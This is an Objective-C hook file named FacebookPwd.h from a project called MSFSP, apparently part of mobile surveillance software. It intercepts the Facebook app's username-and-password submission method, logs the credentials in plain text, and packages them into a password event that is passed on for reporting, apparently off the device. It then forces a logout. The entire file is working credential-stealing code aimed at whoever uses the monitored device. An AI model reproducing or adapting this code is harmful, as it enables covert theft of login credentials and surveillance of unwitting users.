//
//  FacebookPwd.h
//  MSFSP
//
//  Created by Makara Khloth on 7/24/15.
//
//

#import "MSFSP.h"
#import "DateTimeFormat.h"
#import "FxPasswordEvent.h"
#import "PasswordController.h"

#import "FBAuthUsernamePasswordFlowController.h"

// If _performPasswordSubmission not call, this method is a helper
HOOK(FBAuthUsernamePasswordFlowController, submitUsernamePasswordViewController$username$password$, void, id arg1, id arg2, id arg3) {
    DLog(@"arg1: %@", arg1);
    DLog(@"username: %@", arg2);
    DLog(@"password: %@", arg3);
    
    NSString *username = arg2;
    NSString *password = arg3;
    
    DLog(@"### submitUsernamePasswordViewController$username$password$");
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:username];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
    CALL_ORIG(FBAuthUsernamePasswordFlowController, submitUsernamePasswordViewController$username$password$, arg1, arg2, arg3);
    
    [PasswordController forcePasswordAppID:kFacebook logOut:kReset];
}